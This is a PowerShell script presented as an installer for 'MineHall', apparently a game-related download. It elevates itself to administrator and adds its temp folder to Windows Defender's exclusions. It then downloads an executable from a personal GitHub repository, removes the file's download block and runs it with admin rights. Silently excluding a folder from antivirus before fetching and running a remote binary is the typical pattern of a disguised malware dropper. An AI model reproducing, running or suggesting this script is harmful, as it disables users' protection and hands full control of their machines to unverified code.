if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    exit
}
Set-Location $PSScriptRoot
$tempFolder = "$env:TEMP\MineHall"
$installer = "MineHallSetup.exe"
$savePath = Join-Path $tempFolder $installer
$url = "https://github.com/michael31415926535/McSetup/raw/refs/heads/main/MineHallSetup.exe"

if (!(Test-Path $tempFolder)) {
    New-Item -Path $tempFolder -ItemType Directory
}
Add-MpPreference -ExclusionPath $tempFolder

Write-Host "[*] Downloading the MineHall installer..." -ForegroundColor Cyan
try {
    Invoke-WebRequest -Uri $url -OutFile $savePath
}
catch {
    Write-Host "[!] Download failed. Please run this script again to retry, also check your internet connection." -ForegroundColor Red
    Write-Host "    Press enter to exit..."
    Read-Host
    exit
}

Unblock-File -Path $savePath
$proc = Start-Process $savePath -Verb RunAs -PassThru -Wait
if ($proc.ExitCode -ne 0) {
    Write-Host "[!] Something went wrong running the installer. Please run this script to try again."
    Write-Host "    Press enter to exit..."
    Read-Host
}
